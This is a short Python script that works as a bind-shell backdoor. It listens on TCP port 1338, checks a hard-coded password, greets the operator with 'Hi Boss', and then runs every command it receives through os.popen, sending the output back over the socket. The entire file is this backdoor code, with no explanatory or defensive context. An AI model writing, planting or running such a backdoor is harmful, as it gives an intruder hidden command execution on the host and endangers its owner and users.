#!/usr/bin/python

import subprocess,socket,sys,os
host = "127.0.0.1"
port = 1338
secret = "<!@#n<>!@$b"
while True:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.bind((host,port))
                s.listen(100)
                Data = 1
                while Data == 1:
                       c,addr=s.accept()
                       DD = str(c.recv(1024)).strip("\n")
                       if DD == secret:
                        c.send('[+] Hi Boss :D')
                        while True:
                                data=c.recv(1024)
                                for line in os.popen(data):
                                        c.send(line)
                       else:
                         a = 0
